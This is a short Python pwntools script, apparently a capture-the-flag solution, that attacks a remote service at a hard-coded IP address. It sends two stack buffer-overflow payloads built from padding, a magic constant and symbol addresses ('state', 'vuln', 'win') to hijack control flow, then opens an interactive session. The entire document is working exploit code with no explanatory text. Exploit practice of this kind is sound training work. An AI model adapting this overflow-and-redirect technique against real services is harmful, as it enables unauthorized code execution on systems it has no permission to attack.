from pwn import *

pwnlib.context.context.clear(arch='amd64', os='linux')

r = remote("65.109.201.174", 5004)

e = pwnlib.elf.ELF('chall')

state_addr = e.symbols['state'] + 31

vuln = e.symbols['vuln'] + 8

payload = bytearray()
payload += ('a' * (0x20)).encode('ascii')
payload += p64(state_addr)
payload += p64(vuln)
print(f"first payload = {payload}")

r.send(payload)
win = e.symbols['win'] + 5

payload = bytearray()
payload += p32(0xf1eeee2d)
payload += ('a' * 35).encode('ascii')
payload += p64(win)

print(f"second payload = {payload}")
r.send(payload)

r.interactive()
r.close()
